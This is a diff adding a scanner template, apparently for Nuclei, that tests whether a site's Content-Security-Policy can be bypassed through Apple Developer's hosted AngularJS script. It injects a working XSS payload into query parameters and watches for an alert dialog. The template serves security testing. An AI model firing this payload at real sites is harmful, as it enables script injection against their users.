@@ -1,0 +1,55 @@
+id: apple-developer-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Apple Developer
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,apple-developer
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "apple.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: apple_developer_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://developer.apple.com/search/scripts/vendor/angular-custom.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "apple_developer_csp_xss == true"
+# digest: 490a0046304402203b9010e7897ca61d8bd2ad7ab3f2d103a1ba1cc77032d5bcfa54d370cbb32c1a02206e636d8a5add26e8ee56f01bf75baa9c497e79dd9fc6b6513faf33fc4c3168bf:922c64590222798bb761d5b6d8e72950
